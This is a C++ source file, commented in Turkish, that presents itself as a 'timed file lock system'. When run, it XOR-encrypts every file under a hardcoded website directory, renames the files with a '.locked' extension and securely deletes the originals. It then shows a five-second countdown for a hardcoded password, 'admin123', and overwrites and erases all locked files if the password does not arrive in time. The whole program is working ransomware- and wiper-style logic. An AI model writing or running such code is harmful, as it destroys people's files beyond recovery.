#include <iostream>
#include <fstream>
#include <filesystem>
#include <chrono>
#include <thread>
#include <string>
#include <iomanip>
#include <vector>
#include <algorithm>

namespace fs = std::filesystem;

// İşletim sistemine göre kütüphane seçimi
#ifdef _WIN32
    #include <conio.h>
    #include <windows.h>
#else
    #include <termios.h>
    #include <unistd.h>
    #include <sys/select.h>
#endif

const std::string ADMIN_PASSWORD = "admin123";
const std::string TARGET_PATH = "/home/yigit/vellora-website";
const int LOCK_DURATION_SECONDS = 5;
const std::string CRYPTO_KEY = "Hizli_XOR_Anahtari_2026";

#ifndef _WIN32
void setTerminalMode(bool enable) {
    struct termios tty;
    tcgetattr(STDIN_FILENO, &tty);
    if (!enable) {
        tty.c_lflag &= ~(ICANON | ECHO);
    } else {
        tty.c_lflag |= (ICANON | ECHO);
    }
    tcsetattr(STDIN_FILENO, TCSANOW, &tty);
}

bool kbhit() {
    struct timeval tv = {0, 0};
    fd_set fds;
    FD_ZERO(&fds);
    FD_SET(STDIN_FILENO, &fds);
    return select(STDIN_FILENO + 1, &fds, NULL, NULL, &tv) > 0;
}
#endif

// Dosyanın üzerini sıfırlarla kaplayıp diskten güvenli şekilde siler
bool secureDelete(const fs::path& filePath) {
    std::error_code ec;
    uintmax_t fileSize = fs::file_size(filePath, ec);
    
    if (!ec && fileSize > 0) {
        std::ofstream file(filePath, std::ios::binary | std::ios::in | std::ios::out);
        if (file.is_open()) {
            constexpr size_t BLOCK_SIZE = 4096;
            std::vector<char> zeroBuffer(BLOCK_SIZE, 0);
            uintmax_t bytesWritten = 0;

            while (bytesWritten < fileSize) {
                uintmax_t toWrite = std::min(static_cast<uintmax_t>(zeroBuffer.size()), fileSize - bytesWritten);
                file.write(zeroBuffer.data(), toWrite);
                bytesWritten += toWrite;
            }
            file.flush();
            file.close();
        }
    }
    return fs::remove(filePath, ec);
}

void processSingleFile(const fs::path& filePath, bool encrypt) {
    std::ifstream inFile(filePath, std::ios::binary);
    if (!inFile) return;
    std::string data((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
    inFile.close();

    for (size_t i = 0; i < data.size(); ++i) {
        data[i] ^= CRYPTO_KEY[i % CRYPTO_KEY.size()];
    }

    std::string newPathStr = encrypt ? filePath.string() + ".locked" : filePath.string().substr(0, filePath.string().length() - 7);
    
    std::ofstream outFile(newPathStr, std::ios::binary);
    if (outFile) {
        outFile.write(data.data(), data.size());
        outFile.close();
        
        if (encrypt) {
            // Şifrelerken orijinal açık dosyayı güvenli şekilde sil
            secureDelete(filePath);
        } else {
            // Şifre çözerken .locked uzantılı dosyayı standart sil
            fs::remove(filePath);
        }
    }
}

void processFiles(bool encrypt) {
    if (!fs::exists(TARGET_PATH)) return;

    for (const auto& entry : fs::recursive_directory_iterator(TARGET_PATH)) {
        if (entry.is_regular_file()) {
            std::string pathStr = entry.path().string();
            if (encrypt && pathStr.length() >= 7 && pathStr.substr(pathStr.length() - 7) == ".locked") continue;
            if (!encrypt && (pathStr.length() < 7 || pathStr.substr(pathStr.length() - 7) != ".locked")) continue;
            
            processSingleFile(entry.path(), encrypt);
        }
    }
}

// Süre bittiğinde kilitli tüm dosyaları imha eder
void destroyLockedFiles() {
    if (!fs::exists(TARGET_PATH)) return;

    for (const auto& entry : fs::recursive_directory_iterator(TARGET_PATH)) {
        if (entry.is_regular_file()) {
            std::string pathStr = entry.path().string();
            if (pathStr.length() >= 7 && pathStr.substr(pathStr.length() - 7) == ".locked") {
                secureDelete(entry.path());
            }
        }
    }
}

int main() {
    std::cout << "--- SURELI DOSYA KILIT SISTEMI ---\n";
    processFiles(true);
    std::cout << "Dosyalar kilitlendi! ('.locked' uzantisi eklendi)\n\n";

#ifndef _WIN32
    setTerminalMode(false);
#endif

    int remaining = LOCK_DURATION_SECONDS;
    std::string inputBuffer = "";
    std::string statusMsg = "";
    bool isUnlocked = false;

    auto lastTick = std::chrono::steady_clock::now();

    while (remaining > 0 && !isUnlocked) {
        // Klavyeden Girdi Kontrolü
#ifdef _WIN32
        if (_kbhit()) {
            char ch = _getch();
#else
        if (kbhit()) {
            char ch = std::cin.get();
#endif
            if (ch == '\n' || ch == '\r') {
                if (inputBuffer == ADMIN_PASSWORD) {
                    isUnlocked = true;
                    break;
                } else {
                    statusMsg = " [HATALI SIFRE!]";
                    inputBuffer.clear();
                }
            } else if (ch == 127 || ch == '\b') {
                if (!inputBuffer.empty()) {
                    inputBuffer.pop_back();
                }
            } else if (ch >= 32 && ch <= 126) {
                inputBuffer += ch;
                statusMsg = "";
            }
        }

        // Geri Sayım Zamanlayıcısı
        auto now = std::chrono::steady_clock::now();
        if (std::chrono::duration_cast<std::chrono::seconds>(now - lastTick).count() >= 1) {
            remaining--;
            lastTick = now;
        }

        // Ekrana Yazdırma
        int mins = remaining / 60;
        int secs = remaining % 60;
        std::cout << "\r\033[K" << "Kalan Sure: " << std::setfill('0') << std::setw(2) << mins << ":" 
                  << std::setfill('0') << std::setw(2) << secs 
                  << " | Sifre: " << std::string(inputBuffer.length(), '*') << statusMsg << std::flush;

        std::this_thread::sleep_for(std::chrono::milliseconds(20));
    }

#ifndef _WIN32
    setTerminalMode(true);
#endif

    // Sonuç Durumu Kontrolü
    if (isUnlocked) {
        std::cout << "\n\nDOGRU SIFRE! KILIT KALDIRILIYOR...\n";
        processFiles(false);
        std::cout << "Tum dosyalar desifre edildi!\n";
    } else {
        std::cout << "\n\nSURE BITTI! KILITLI DOSYALAR GUVENLI SEKILDE SILINIYOR...\n";
        destroyLockedFiles();
        std::cout << "Tum kilitli dosyalar kalici olarak imha edildi!\n";
    }

    return 0;
}
